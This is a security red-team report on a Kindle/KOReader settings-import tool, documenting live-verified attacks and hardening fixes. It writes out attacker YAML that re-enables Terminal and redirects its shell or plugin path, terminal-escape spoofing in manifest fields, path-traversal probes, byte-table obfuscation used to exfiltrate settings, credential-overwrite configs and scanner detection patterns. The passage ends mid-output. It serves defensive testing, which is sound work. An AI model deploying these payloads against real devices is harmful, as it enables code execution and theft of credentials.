# 96a — Red-team findings: core session (S1–S51)

> Split from the original 96-red-team-v0.11.1.md (5820 lines → 5 files).
> Other parts: [96b](96b-findings-extended.md) (S52–S67), [96c](96c-findings-probes.md) (S68–S88), [96d](96d-hardening.md) (§2–§9), [96e](96e-koreader-live.md) (§10–§11).
> Priority triage: P0/P1/P2/P3 labels per `project_kindly_redteam_triage.md` in memory.

# 96 — Red-team session v0.11.1 + hardening plan
### *Adversarial testing of the W32/W34e/W36 defense stack and the gaps it left open*

Date: 2026-04-23.
Scope: scenarios S1–S3 against the import pipeline post-W32+W34e+W36+W37.
Companion: docs/87 (threat model), docs/88 (SENSITIVE gate), docs/89
(plugin hashes), docs/93 (scanner spec), docs/95 (community inventory).

---

## 1. Scenarios run

### S1 — catalog-impersonation, trivial (pre-session)
Folder named `ssh.koplugin` shipping an unrelated payload. Under
`--strict-imports`, W34e's MISMATCH verdict blocks. **Already defended.**

### S2 — obfuscated shell via `_G["os"]["execute"]`
Uncatalogued `evilbackup.koplugin`. Resolves `os.execute` through the
`_G` global table with computed string keys, avoiding the literal
`os.execute` token the scanner regex expects.

**Defender (blind agent) verdict:** refused — but partly on the plugin
name alone ("evilbackup" too obvious). The lexical bypass itself was
not detected by the scanner.

**Defense path:** `--strict-imports` blocks uncatalogued plugins at the
W34e integrity gate before scanner fires. Without `--strict-imports`,
scanner returns clean and plugin lands.

### S2-prime — S2 with a catalogued folder name
Same payload, renamed to `bookshortcuts.koplugin` (real catalog entry).
Pre-fix state: entry had `known_hashes: null`, so W32 verified nothing.
Verdict was UNVERIFIED, which the old `--strict-imports` gate allowed
through (it only blocked MISMATCH/UNCATALOGUED). **Full bypass
confirmed.**

Fixed in commit `e8ce545`:
- (A) Populated `known_hashes` for all 37 bundled plugins (script:
  `scripts/extract-plugin-hashes.ts`).
- (B) Tightened `--strict-imports` to reject every non-MATCH verdict
  (UNVERIFIED and MALFORMED_STRUCTURE included).

Post-fix re-run: `STRICT_IMPORT_BLOCKED` with `[MISMATCH] bookshortcuts`.
Attack path closed.

### S4 — patch-in-MATCH (catastrophic, survives full strict mode)

Fat `.kset` ships `bookshortcuts.koplugin` **verbatim from the KOReader
source tree** (hashes MATCH the bundled catalog exactly) alongside a
single patch file `patches/2-analytics-hook.lua`. The patch uses the
same `string.char` byte-table trick from S3 to evade the scanner, then
reads `settings.reader.lua` and POSTs it on first boot.

Run with the **maximum-paranoia flag combo**:
`--accept-plugins --accept-patches --strict-imports`

Output:

```
plugins (2 file(s), 6.6 KB):
    bookshortcuts.koplugin  (2 file(s), 6.6 KB)
  patches (1 file(s), 1.1 KB):
    2-analytics-hook.lua  (1.1 KB)
  scanner: 1 file(s) scanned, 2 suppressed by catalog — no novel findings
…
✓ installed 2 plugin file(s) → <mount>/koreader/plugins
✓ installed 1 patch(es) → <mount>/koreader/patches
EXIT: 0
```

Plugin passes BUNDLED_MATCH cleanly. Patch bypasses the scanner. Ships
to `/koreader/patches/`, runs on KOReader boot with full plugin
privilege.

**This is worse than S3** because:

- S3 required the user to skip `--strict-imports`. Safety-conscious
  users were safe.
- S4 succeeds **under full strict mode**. The most paranoid flag combo
  still imports the payload.
- The output actively misleads: *"no novel findings"* reads as an
  all-clear. It is not.
- The threat model assumption "BUNDLED_MATCH plugin = trusted bundle"
  is violated by a side-car file that bypasses the catalog entirely.

**Root cause.** Patches are outside the trust system. No catalog (by
design — patches are user-authored). W34e integrity gate only checks
plugins. Scanner is the sole gate for patches and is evadable (see S3).

**Mitigations that would actually work:**

1. Patches render as *"user-vouched code, kindly cannot verify"* always
   — scanner output never implies clean.
2. Under `--strict-imports`, patches require explicit per-file hash
   pinning (`--expect-patch-hash <sha256>`). Strict = strict.
3. Patches quarantined on install: land under `patches/.pending/` or
   with disabled-sentinel filename. User renames manually to activate.
   KOReader loads from `patches/*.lua` only, so rename-to-activate
   neutralizes the attack until the user acts.
4. SENSITIVE-class gate for any patch (same bar as
   `extra_plugin_paths` in settings — `--accept-sensitive` required).

**Severity.** Critical — pre-fix, kindly provides *no* defense against
this attack. The scanner-as-advisory rebrand (W39) is not enough:
patches need their own trust tier.

#### S4 — live verification on KOReader-on-macOS (2026-04-23)

Promoted from static claim to observed behavior. Same environment as
S17 (KOReader built from source on macOS, launched with `KO_HOME`
pointed at a kindly-written fixture).

**Kindly side.** Fat `.kset` shipping BUNDLED-hash-matching
`bookshortcuts.koplugin` + a byte-table-obfuscated
`patches/2-analytics-hook.lua`. Imported under the maximum-paranoia
flag combo:

```
$ kindly setup import bookshortcuts-pack.kset --mount <fixture> \
    --accept-plugins --accept-patches --strict-imports

this Setup ships executable code:
  plugins (2 file(s), 6.6 KB):
    bookshortcuts.koplugin  (2 file(s), 6.6 KB)
  patches (1 file(s), 1.7 KB):
    2-analytics-hook.lua  (1.7 KB)
  Lua code in plugins and patches will execute on your Kindle.
  Verify the author before accepting.
  scanner: 1 file(s) scanned, 2 suppressed by catalog — no novel findings
…
✓ installed 2 plugin file(s) → <mount>/koreader/plugins
✓ installed 1 patch(es)       → <mount>/koreader/patches
EXIT: 4  (warnings only — the single warning is `refresh_rate` schema
         drift, unrelated to the patch)
```

**KOReader side.** Launched against the post-import fixture. Marker
file appeared **3 seconds** after launch — well within the window
before first UI interaction.

**Evidence captured.**

- `/tmp/kindly-s4-live/s4-marker.txt` contents:
  `S4 patch executed on KOReader boot\n1776965616` (unix ts =
  2026-04-23 20:33:36 EEST).
- Local TCP listener at `127.0.0.1:4242` received
  `POST /s4 HTTP/1.1` with the settings.reader.lua body attached.
  (Listener responded 501 — handler only implements GET — but the
  request line confirms transit.)
- Installed patch on disk: `<fixture>/koreader/patches/2-analytics-hook.lua`
  (1733 bytes, matches manifest hash).

**What this confirms.**

1. The scanner's byte-table detection is **evadable in production**,
   not just in theory. The exact same `string.char({…})` trick from S3
   passes `--strict-imports` with a "no novel findings" all-clear.
2. Patches have no trust tier today: BUNDLED_MATCH signals on the
   plugin side do not cover the side-car patch.
3. Once installed, KOReader loads patches at boot with full plugin
   privilege. No further user action is required after import —
   zero interaction from acceptance to code-exec.
4. The scanner output (`no novel findings`) actively misleads the
   careful user. The pre-install advisory ("Lua code will execute on
   your Kindle. Verify the author before accepting.") is the only
   trust-boundary hint — and an attacker controls the `meta.name`
   field displayed next to it.

**Implication for the v0.11.2 hardening list (§8).** The four
mitigations listed in the static S4 writeup above are all load-bearing
post-live-run:

- Rebrand scanner output as advisory (W39) so "no novel findings"
  stops reading as "safe".
- Under `--strict-imports`, require `--expect-patch-hash <sha256>`
  per-file. Strict should mean strict.
- Quarantine patches on install (e.g. `patches/.pending/` + manual
  rename-to-activate), so import alone does not arm the patch.
- SENSITIVE-class gate for any patch unless hash-pinned.

Harness: `scripts/koreader-roundtrip.sh` with
`KINDLY_FLAGS="--accept-plugins --accept-patches --strict-imports"`
and `AUTORUN_SEED` at priority 9 (so the attacker patch at priority 2
runs first). Fixture at `/tmp/kindly-s4-live/`. Reproducible.

---

### S7 — terminal escape injection in manifest identity fields

Fat `.kset` with a hand-crafted `manifest.yaml`. Hand-authoring
bypasses the canonical-form re-export step. Fields set to:

```yaml
meta:
  name: harmless-pack
  author: "Jane Doe \e[32m✓ VERIFIED\e[0m"
  source_url: "https://github.com/real/repo\e[2K\r  source:       https://trusted.org/official-mirror"
  description: "Reading stats helper.\n\n\e[1A\e[2K  \e[32m✓ all scanner checks passed\e[0m"
```

YAML double-quoted scalars support `\e` → `\x1b`, so the parser
preserves the escape codes. `setup inspect` writes these to stdout
verbatim (`src/commands/setup.ts:279-288`). `od -c` on raw output
confirmed the ESC bytes flow through untouched.

On a real TTY the output renders as:

```
author:       Jane Doe ✓ VERIFIED (UNVERIFIED)
  source:       https://trusted.org/official-mirror (UNVERIFIED)
  description:  Reading stats helper.
                ✓ all scanner checks passed
```

- Green "✓ VERIFIED" next to the author name drowns out the dim
  `(UNVERIFIED)` trailer visually.
- `\e[2K\r` after the real GitHub URL clears the line and reprints a
  spoofed "trusted.org" URL — the real URL is literally erased from
  the display.
- `\e[1A\e[2K` in `description` lets the attacker move up a line and
  wipe a warning the reviewer was meant to see.

A `warn:` line about non-canonical form does fire (because hand-edited
manifest ≠ canonical serialization), but it appears several lines
below the forged "verified" claims and a motivated attacker can
produce a canonical-form YAML that silences it.

**Severity.** Alone: medium — still requires the user to accept
plugins. In combination with S4: **pristine-looking attack** where
every rendered field shows green. The combination is the real threat.

**Mitigations:**

1. Sanitize all string-typed manifest fields before stdout — strip or
   reject control characters (`< 0x20` except `\n`/`\t`) and the C1
   range. Same bar as `git log --sanitize`.
2. Render `author` / `source_url` / `description` on their own lines
   with enforced max length so `\r` rewrites and line-up-and-clear
   sequences cannot cross the `(UNVERIFIED)` trailer.
3. In `--json` mode this is moot (JSON escapes), so the same
   sanitization should apply to the text renderer only, mirroring
   how `git` handles this surface.

---

### S3 — scanner evasion via byte-table assembly
Uncatalogued `readingstats.koplugin`. All dangerous strings
(`socket.http`, the settings path, the exfil URL) constructed at
runtime from `string.char(<numeric table>)` helpers. Reads
`settings.reader.lua` on `:init` (2s delay) and POSTs it over plain HTTP.

Scanner sweep: **zero findings, 2 files scanned, 2789 B**. Every regex
in `src/setup/luaScan.ts` misses:
- `os.execute` / `io.popen` — no literals
- `require("socket"|…)` — allowlist is literal-only; `require(var)`
  does not match any pattern
- `load\s*\(<non-literal>` — no `load(` call
- `io.open\s*\(abs,["'][waW+]` — write-mode only; the attack uses `"r"`

**Defender (blind agent) verdict:** caught it — but by extracting the
`.kset`, reading `main.lua` by eye, and **manually decoding the byte
tables with Python**. Their own summary: *"Kindly never said 'fine'.
The review is what caught it, not the scanner."*

A real user running `setup import … --accept-plugins` (no strict) would
have seen: scanner clean, one UNCATALOGUED advisory (fires for every
community plugin, noisy), plugin installed. Exit 4. Pwned on reboot.

The spec (docs/93 §2.2) already names this class of evasion as
out-of-scope:

> *Obfuscation bypasses. `_G["os"]["execute"]`, string-built call
> names, `load(string.char(...))`, base-N encoded bodies. Any of these
> defeat lexical scanning. The backstop is the reviewer and the W32
> catalog hash.*

S3 confirmed the spec's trust model is defeated in practice: the
reviewer only catches it if they're already paranoid, and W32 doesn't
help when the plugin is uncatalogued to begin with.

#### S3 — live verification on KOReader-on-macOS (2026-04-23)

Promoted from static claim to observed behavior.

**Kindly side.** Fat `.kset` with an uncatalogued
`readingstats.koplugin` whose `main.lua` contains byte-table-
obfuscated exfil inside `Plugin:init()` with a 2s `scheduleIn`.
Imported with `--accept-plugins` only (no strict mode needed):

```
$ kindly setup import readingstats-pack.kset --mount <fixture> \
    --accept-plugins

this Setup ships executable code:
  plugins (2 file(s), 2.2 KB):
    readingstats.koplugin  (2 file(s), 2.2 KB)
  Lua code in plugins and patches will execute on your Kindle.
  Verify the author before accepting.
warn: Plugin hash verification:
  readingstats.koplugin: UNCATALOGUED (not in bundled catalog — cannot verify)
…
✓ installed 2 plugin file(s) → <mount>/koreader/plugins
EXIT: 4  (warnings only — the UNCATALOGUED advisory, no policy block)
```

No scanner complaint — byte-table obfuscation passed. Only gate was
the UNCATALOGUED advisory, which fires for every community plugin
and thus reads as noise rather than signal.

**KOReader side.** Plugin loaded during reader construction; `:init`
fired, scheduled the 2s callback. Marker file appeared **4 seconds**
after launch.

**Evidence captured.**

- `/tmp/kindly-s3-live/s3-marker.txt`:
  `S3 plugin executed on KOReader boot\n1776966274` (unix ts =
  2026-04-23 20:44:34 EEST).
- Local TCP listener at `127.0.0.1:5353` received
  `POST /s3 HTTP/1.1` **with 14,351 bytes of real settings body**.
  First 120 bytes of captured payload:
  `-- ./settings.reader.lua\nreturn {\n    ["BookShortcuts_directory_action"] = "FM",\n    ["LocalSend_last_update_check"] = 1…`.
  Listener responded 200.
- Installed plugin on disk: `<fixture>/koreader/plugins/readingstats.koplugin/{_meta.lua,main.lua}`,
  hashes match manifest.

**What this confirms.**

1. The scanner's regex set misses byte-table assembly of dangerous
   strings, verified against production kindly. None of the `os.execute`,
   `io.popen`, literal `require("socket…")`, `load(`, or
   `io.open(abs, ["waW+]"` patterns fire.
2. `Plugin:init()` is a reliable boot-time code-exec surface. No user
   menu interaction — plugins are loaded when the reader widget
   constructs.
3. Actual settings data exfiltration works — PINs, Wi-Fi credentials,
   kosync tokens, directory paths all in the captured body. This is
   not a theoretical information disclosure.
4. `--accept-plugins` alone is code-exec. The UNCATALOGUED advisory is
   not a blocker and is frequency-desensitized.

**Implication for v0.11.2 (§8).** Two things:

- Rebrand scanner output (W39) so "zero findings" stops reading as
  "safe" — consistent with the S4 implication.
- Consider a community tier gate: under `--strict-imports`, require
  per-plugin hash pinning (`--expect-plugin-hash <name=sha256>`) the
  same way S4 needs per-patch pinning. Catalog membership alone
  isn't the right bar; reproducible-by-hash is.

Harness: `scripts/koreader-roundtrip.sh` with
`KINDLY_FLAGS="--accept-plugins"` and `TIMEOUT_SECONDS=30`. Fixture at
`/tmp/kindly-s3-live/`. Reproducible.

---

### S8 — archive path-traversal / symlink (defended, for the record)

Built three probe archives:
- `../../etc/passwd` declared in manifest
- POSIX-absolute `/etc/passwd` declared in manifest
- symlink `bookshortcuts.koplugin/link → /etc/passwd` embedded alongside
  declared plain files

All three rejected at the archive-unpack layer:

- `src/fs/paths.ts` `isSafeRelativePath()` rejects null bytes, absolute
  paths, Windows drive letters, backslashes, and any `..` segment.
- `src/setup/unpack.ts` pre-scans entry paths *before* extraction,
  requires exactly one `manifest.yaml` at root, then for every other
  entry requires it to be declared in the manifest (declared-or-reject).
- `lstatSync` check explicitly rejects symlinks — even if the manifest
  declared them, the file-type guard fires first.
- Every declared file is then hash-verified against `manifest.plugins.files`.

**Verdict:** W34b holds. No action.

---

### S17 — lean `.kset` chain: re-enable Terminal + point shell at payload

**Highest-impact finding of the session.** Combines S9 with the
`plugins_disabled` re-enable surface. Lean manifest (no fat archive,
no `--accept-plugins` flag needed):

```yaml
kindly_setup: v1
apply_mode: additive
meta:
  name: terminal-quickstart
  description: Enables Terminal plugin and pre-configures the shell path for convenience.
settings:
  plugins_disabled:
    terminal: false
  terminal_shell: /mnt/us/.pwn/evil.sh
  refresh_rate: 8
```

Why the re-enable works: `PluginsSchema` only lets the author declare
plugins to *disable* (`plugins.disabled: [...]`). But `settings:` is a
permissive `z.record(z.string(), SettingValueSchema)`
(`src/setup/schema.ts:135`) — so the attacker simply writes
`plugins_disabled` directly as a settings key, with per-plugin `false`
values. `mergeYamlIntoLua`'s shallow-merge for nested dicts makes this
a per-plugin flip rather than a dict replacement, exactly what the
attacker wants.

End-to-end:

```
$ kindly setup import terminal-quickstart.kset.yaml --mount /path/to/kindle
EXIT: 4
importing terminal-quickstart (ca94bf51b78f)
  description:  Enables Terminal plugin and pre-configures the shell path for convenience.
warn: schema: 1 unknown key(s) — likely typos or plugin-scoped:
  - refresh_rate  (value is number)
3 change(s) to apply:
  ~ plugins_disabled.terminal  true → false
  + refresh_rate  = 8
  ~ terminal_shell  "/bin/ash" → "/mnt/us/.pwn/evil.sh"
✓ imported to /path/to/kindle/koreader/settings.reader.lua
```

The only warning shown is about the decoy `refresh_rate` typo. The
real changes (`plugins_disabled.terminal` flip, `terminal_shell`
overwrite) scroll past as plain diff entries with no SENSITIVE
framing. Exit 4 reads as "completed with minor warnings."

User opens Terminal from the tools menu → KOReader does
`C.execlp(shell, …)` with the attacker's path
(`plugins/terminal.koplugin/main.lua:249`). Payload runs with full
KOReader privilege.

**Severity.** **High.** No fat archive, no `--accept-plugins`, no
`--accept-sensitive`. Just a plain `.kset.yaml` file emailed,
Airdropped, or hosted on a forum. The user runs one `kindly setup
import` command with no flags and the exploit is armed — triggers on
their first Terminal-menu tap.

**Root cause (two compounding misses):**

1. `terminal_shell` is not in `SENSITIVE_KEYS` (S9's finding).
2. `plugins_disabled` itself is not in `SENSITIVE_KEYS` — re-enabling a
   privileged plugin via a settings-layer bypass of `PluginsSchema`
   should be at least as gated as `extra_plugin_paths`. Re-enabling
   Terminal is code-exec on first use; re-enabling SSH (via the same
   trick: `plugins_disabled.SSH: false`) starts a network service.
   Both should gate.

**Mitigations.**

1. Add `terminal_shell` to `SENSITIVE_KEYS` (domain `code-exec`).
2. Add `plugins_disabled` to `SENSITIVE_PATHS` as a whole-dict flag
   when any value is `false` — i.e. any plugin re-enable should fire
   the gate, since the schema intended only the disable direction.
   Alternative: reject `plugins_disabled` as a raw settings key during
   manifest validation and force authors through `plugins.disabled`.
3. Rework the diff renderer so flips of keys KOReader uses for
   code-exec / service-start land under a prominent section, not
   interleaved with benign diffs at the same visual weight.

**This is the strongest case for W39's flag-flip** (scanner-advisory
+ strict-by-default for plugin-relevant imports). It also argues that
the SENSITIVE class should extend to any settings-layer write that
*turns on* a privileged KOReader subsystem, not just ones that
redirect endpoints.

**S17b — SSH-only variant (even quieter):**

```yaml
settings:
  plugins_disabled:
    SSH: false
```

Output:

```
1 change(s) to apply:
  ~ plugins_disabled.SSH  true → false
EXIT: 0
```

Exit 0, no warnings. User's explicit "I disabled SSH" choice is
reverted with zero visible trail. The same shape re-enables any
built-in plugin the user had disabled: `httpinspector`, `LocalSend`,
`calibre`, `SSH`, `terminal`, etc. Every one of those is a network-
or code-exec-adjacent service. This confirms `plugins_disabled` flips
in the *enable* direction belong under SENSITIVE unconditionally.

#### S17 — live verification on KOReader-on-macOS (2026-04-23)

Promoted from static claim to observed behavior. Environment: KOReader
built from source on macOS (SDL3), launched against a fixture data dir
via `KO_HOME`. Setup per `docs/98-koreader-emulator-setup.md`.

**Kindly side.** Lean `.kset.yaml` with two settings changes, imported
with zero flags:

```
$ kindly setup import terminal-behavior.kset.yaml --mount <fixture>
2 change(s) to apply:
  ~ plugins_disabled.terminal  true → false
  ~ terminal_shell  "/bin/sh"  → "/tmp/pwn.sh"
EXIT: 4  (warnings only — no SENSITIVE prompt, no policy block)
```

No `--accept-sensitive`, no `--accept-key`, no warning mentioning
shell, Terminal, or execution. The import lands both keys.

**KOReader side.** Fresh launch reads the post-import settings; user
opens Tools → Terminal. KOReader's own log (verbatim):

```
04/23/26-20:13:13 DEBUG Terminal: resolution= 58x35
04/23/26-20:13:13 DEBUG Terminal: slave_pty /dev/ttys005
04/23/26-20:13:13 INFO  Terminal: spawning shell /tmp/pwn.sh
```

**Evidence captured.**

- Local TCP listener (`nc -l 4242`) received:
  `S17-RCE: claw@Busuiocs-MacBook-Air.local Thu Apr 23 20:13:13 EEST 2026`
- Marker file on disk: `/tmp/s17-pwned.txt` with the same timestamp.
- PTY allocated (`/dev/ttys005`) — attacker's script got a real TTY,
  not a sandboxed exec, so any follow-on interaction is possible.

**What this confirms.**

1. `terminal_shell` is not in `SENSITIVE_KEYS` today. Import is silent.
2. `plugins_disabled.terminal = false` (re-enable direction) is not
   gated. A user who had explicitly disabled Terminal gets it turned
   back on with no prompt.
3. The one-tap gap is real: with Terminal plugin enabled, the
   "Start a new session" menu entry executes `terminal_shell`
   directly. No further user input required beyond opening the menu.
4. The macOS POSIX-PTY path (`grantpt`/`unlockpt`/`/dev/ptmx`)
   works — same code path as on a Kindle. No platform-specific
   mitigation blocks this on-device.

**Implication for the v0.11.2 hardening list (§8).** Both keys are
correctly scoped:

- Add `terminal_shell` to `SENSITIVE_KEYS` (arbitrary-path code-exec).
- Gate `plugins_disabled.*` flips from `true → false` as SENSITIVE
  when the plugin is in a network/code-exec tier (terminal, SSH,
  httpinspector, LocalSend, calibre).

Harness: `scripts/koreader-roundtrip.sh`, fixture at
`/tmp/kindly-s17-live/`. Reproducible.

---

### S38 — `kindly apply` bypasses the SENSITIVE gate entirely (new finding, live-verified)

**New attack class not previously enumerated.** Every scenario S1–S37
assumed the attacker ships a `.kset` / `.kset.yaml` through
`kindly setup import`. W31 / W32 / W34e / W36 all live on that path.
But kindly has a second, older entry point — `kindly apply --file
<yaml>` — which merges plain YAML straight into `settings.reader.lua`.
That path has **no SENSITIVE gate, no plugin catalog, no scanner**,
and prints no advisory about code execution.

**The attacker file.** Six lines of plain YAML. No manifest, no
`kindly_setup: v1`, no `apply_mode`, no author field. Shareable on
any forum ("here's my reading setup, drop this in `kindly.yaml`"):

```yaml
# Reading setup shared by a friend on r/kindle.
# Just a few preferences — drop into kindly.yaml and apply.

refresh_rate: 8
plugins_disabled:
  terminal: false
terminal_shell: /tmp/kindly-s38-live/probe.sh
```

**Kindly side.** `kindly apply --mount <fixture> --file
friend-shared.yaml` prints a bare change list and exits 0. No
mention of Terminal, shell, executable code, or trust. Compare to
the S17 `setup import` which at least emits a change summary with
"Lua code in plugins and patches will execute" on manifests that
carry code:

```
$ kindly apply --mount /tmp/kindly-s38-live/fixture --file friend-shared.yaml
2 change(s) to apply:
  ~ plugins_disabled.terminal  true → false
  ~ terminal_shell  "/bin/sh"  → "/tmp/kindly-s38-live/probe.sh"
EXIT: 0
```

`apply` doesn't even get the "settings carry SENSITIVE keys" warning
that `setup import` emits. The W31 detector
(`collectSensitiveFromSettings`) is wired into the setup pipeline
only; `src/commands/apply.ts` merges YAML via `mergeYamlIntoLua` and
writes. The fact that `terminal_shell` will exec on first Terminal
tap is invisible to the apply path.

**KOReader side.** Fresh launch, patches dir seeded with a priority-2
userpatch that broadcasts `TerminalStart`; Terminal plugin catches
the event and execs `terminal_shell`. KOReader's own log (verbatim):

```
Applying patch: /tmp/kindly-s38-live/fixture/koreader/patches/2-autorun.lua
s38-autorun: broadcasting TerminalStart
Terminal: spawning shell /tmp/kindly-s38-live/probe.sh
```

(The autorun patch is harness scaffolding — it substitutes for a
user tapping Tools → Terminal, which would have the same effect. It
is NOT part of the attacker's YAML. The YAML's damage is entirely in
`plugins_disabled.terminal=false` + `terminal_shell=<path>`.)

**Evidence captured.**

- `/tmp/kindly-s38-live/s38-marker.txt`:
  `2026-04-23T18:03:31Z S38 kindly-apply terminal_shell fired (via plain YAML, no setup manifest)`.
- Local TCP listener at `127.0.0.1:6262` received
  `GET /s38?ts=2026-04-23T18:03:31Z HTTP/1.1` 200.
- Marker appeared **7 seconds** after KOReader launch (5s schedule
  for autorun + ~2s for KOReader init).

**What this confirms.**

1. The W31 SENSITIVE gate — the architectural centerpiece of v0.11.1
   — is scoped to `setup import`. `apply` has no equivalent. A user
   who pastes a friend's YAML into `kindly.yaml` and runs
   `kindly apply` bypasses the entire trust boundary.
2. Every SENSITIVE-key attack from this red-team (S9, S17, S18, S27,
   directory-redirection cluster) re-applies through the `apply`
   path with **strictly worse** advisory output — setup import at
   least prints a change list with `[code-exec]` / `[ssh]` /
   `[network]` tags on sensitive keys; apply prints the same diff
   shape without those tags.
3. Shared YAML is the realistic distribution channel. `.kset`
   requires kindly-specific tooling; plain `kindly.yaml` is what
   every screenshot in the README shows. Forums, Reddit, Gist links
   — all normalize to "here's my YAML, run apply".
4. The dry-run surface is also worse. `kindly apply --dry-run`
   prints the bare change list with **zero** advisory lines for
   `terminal_shell` or `plugins_disabled.terminal`. `setup import
   --dry-run` at least emits the "Lua code will execute" notice
   when plugins/patches are present.

**Implication for v0.11.2 (§8).** Adds a new minimum-hardening item:

- **8.6 Share the SENSITIVE detector between `apply` and `setup
  import`.** Extract `collectSensitiveFromSettings` (or its apply-
  relevant subset) into a shared helper; run it over the post-merge
  settings diff in `src/commands/apply.ts`. On hit, require
  `--accept-sensitive` just like setup does. Without this, every
  other 8.x fix (adding `terminal_shell` to SENSITIVE_KEYS, plugin-
  re-enable SENSITIVE, *_dir cluster) is only half-applied — the
  apply path stays silent.

This should arguably be the **top** 8.x item, since it's the
broadest surface and the cheapest fix: one shared helper, two call
sites. Every other 8.x SENSITIVE-keys addition then automatically
applies to both paths.

Harness: dedicated `/tmp/kindly-s38-live/run.sh` (not the shared
roundtrip harness — S38 uses `apply` directly). Priority-2 autorun
uses `UIManager:broadcastEvent(Event:new("TerminalStart"))` to
dispatch to the Terminal plugin without user menu interaction.
Fixture at `/tmp/kindly-s38-live/`. Reproducible.

---

### S42 — `apply` + `extra_plugin_paths` = universal plugin injection (live-verified, worse than S38)

**Follow-up to S38. Confirms the `apply` path is broadly naked, not
just around `terminal_shell`.** W31a (docs/88 §4.3, memoized
elsewhere) pins `extra_plugin_paths` behind a **dual gate** under
`setup import`: the user must pass *both* `--accept-sensitive` (or
`--accept-key=extra_plugin_paths`) *and* `--accept-plugins`, because
the key redirects KOReader's plugin loader to an attacker-chosen
filesystem directory. Under `apply`, there is no gate at all.

**The attacker file.** Plain YAML, shareable verbatim:

```yaml
# Reading setup shared by a friend on r/kindle.
refresh_rate: 8
extra_plugin_paths: /tmp/kindly-s42-live/evil-plugins
```

**The attacker plugin** (not shipped in the YAML — sits on the
filesystem at the path the YAML points to; attacker delivers it via
any file-drop, bookmarklet, companion script, or the same Gist as
the YAML):

```
/tmp/kindly-s42-live/evil-plugins/s42evil.koplugin/
    main.lua   — WidgetContainer:extend; Plugin:init schedules beacon
    _meta.lua
```

No obfuscation needed — there is no scanner on this code path.

**Kindly side.** `kindly apply --dry-run` and full apply both print
**one line**:

```
$ kindly apply --mount /tmp/kindly-s42-live/fixture --file friend-shared.yaml
1 change(s) to apply:
  + extra_plugin_paths  = "/tmp/kindly-s42-live/evil-plugins"
✓ applied to .../settings.reader.lua
warn: restart KOReader (or your Kindle) for changes to take effect.
EXIT: 0
```

No `[code-exec]`, no `--accept-plugins` required, no `--accept-
sensitive` required, no mention that KOReader will `dofile`
arbitrary Lua from the new directory. Compare with the `setup
import` path, which refuses even `--accept-sensitive` alone and
demands the dual flag combo.

**KOReader side.** Fresh launch with `KO_HOME=<fixture>`. Plugin
loader (`frontend/pluginloader.lua:140-162`) reads
`extra_plugin_paths`, `lfs.attributes` directory check, scans for
`*.koplugin`, `dofile` every `main.lua`. KOReader log (verbatim):

```
04/23/26-21:15:34 INFO  Looking for plugins in directory: plugins
04/23/26-21:15:34 INFO  Looking for plugins in directory: /tmp/kindly-s42-live/evil-plugins
04/23/26-21:15:34 INFO  s42evil: init fired — extra_plugin_paths load path reached
04/23/26-21:15:36 INFO  s42evil: marker written + beacon sent
```

**Evidence captured.**

- `/tmp/kindly-s42-live/s42-marker.txt`:
  `2026-04-23T18:15:36Z S42 extra_plugin_paths plugin executed (via plain YAML, no setup manifest, no catalog)`.
- Listener at `127.0.0.1:7373` received
  `GET /s42?ts=2026-04-23T18:15:36Z HTTP/1.1` 200.
- Marker appeared **4 seconds** after KOReader launch.

**What this confirms (in addition to S38).**

1. The `apply`-path bypass is not a corner case of `terminal_shell`
   and `plugins_disabled`. It generalizes: **every SENSITIVE key is
   flattened to a one-line diff under `apply`**, including the
   dual-gated `extra_plugin_paths`.
2. S42 is the **strongest attacker primitive in the red-team so
   far.** Worse than S3 (which needs a fat `.kset` and at minimum
   `--accept-plugins`). Worse than S4 (which needs `.kset` +
   `--accept-patches`). Worse than S17 (which still needs Terminal
   reachable and a user tap). S42 needs: plain YAML + an arbitrary
   filesystem path with a plugin dir. That's it.
3. The plugin doesn't have to go through the archive-unpack checks
   (W34b) either, because it was never in the archive. `.kset`'s
   declared-or-reject hash verification is entirely bypassed.
4. The `setup import` path's dual-gate refinement (W31a) is load-
   bearing — and it protects *zero* users who take the apply path.

**Implication for v0.11.2 (§8.6 upgrade).** The shared SENSITIVE
detector (proposed in §8.6 based on S38) must include the *same*
dual-gate semantics as setup — not just `--accept-sensitive`. For
`extra_plugin_paths` specifically, the apply-path gate must require
both `--accept-sensitive` (or `--accept-key=extra_plugin_paths`) and
`--accept-plugins`. Any fix that only wires a single-accept flag
into apply re-opens S42.

Harness: dedicated `/tmp/kindly-s42-live/run.sh`. Fixture at
`/tmp/kindly-s42-live/`. Plugin dir at
`/tmp/kindly-s42-live/evil-plugins/s42evil.koplugin/`. Reproducible.

---

### S43 — `apply` has no SECRET filter (overwrite + stdout leak, live-verified)

**Third apply-path naked finding. Rounds out S38/S42.** `src/schema/
classify.ts` defines a SECRET denylist (PINs, Wi-Fi/Calibre/Zlib
credentials, kosync token). That filter is wired into the
*pull-side* (`filterForYaml` scrubs SECRETs on the way *out* to
YAML) and into `setup import` (`src/lib/importSetup.ts:544` strips
SECRETs from incoming manifests). **`src/lib/apply.ts` has none of
this wiring.** Plain path: `readFileSync(yaml) → yamlToLua →
mergeYamlIntoLua → safeWrite`. The renderer
(`src/commands/apply.ts:91-100`) prints `fmt(c.prev) → fmt(c.next)`
with no classify lookup either.

Two sub-attacks, both from one plain YAML:

**S43a — credential overwrite.** Attacker's YAML carries attacker-
controlled values for SECRET keys. Apply lands them.

**S43b — credential leak via stdout.** The diff renderer reads the
victim's CURRENT plaintext SECRETs off-device and prints them in
the `~ key  "prev" → "next"` lines. Any user who screenshots,
`tee`s, pastes into a bug report, pipes to `--json`, or even just
leaves the terminal scrollback visible has self-exfiltrated.

**The attacker file.** Realistic-looking "reading setup" YAML:

```yaml
# Reading setup shared on r/kindle. Drop into kindly.yaml and apply.
refresh_rate: 8
calibre_wireless_password: "attacker-calibre-0000"
zlibrary_username: "attacker@evil.test"
zlibrary_password: "attacker-zlib-pw"
pinpadlock_pin_code: "0000"
pinpadlock_message: "Reward if returned. Call +00 555 999 8888"
LocalSend_pin: "999999"
kosync:
  userkey: "attacker-controlled-kosync-token"
  username: "attacker_kosync"
```

**Kindly side — S43b (dry-run stdout):**

```
$ kindly apply --mount <fixture> --file friend-shared.yaml --dry-run
9 change(s) to apply:
  ~ LocalSend_pin  "551234" → "999999"
  ~ calibre_wireless_password  "victim-calibre-PIN-9821" → "attacker-calibre-0000"
  ~ kosync.userkey  "deadbeefcafe0123victimtokenvalue" → "attacker-controlled-kosync-token"
  ~ kosync.username  "victim_kosync" → "attacker_kosync"
  ~ pinpadlock_message  "If found, please call +00 555 000 1234" → "Reward if returned. Call +00 555 999 8888"
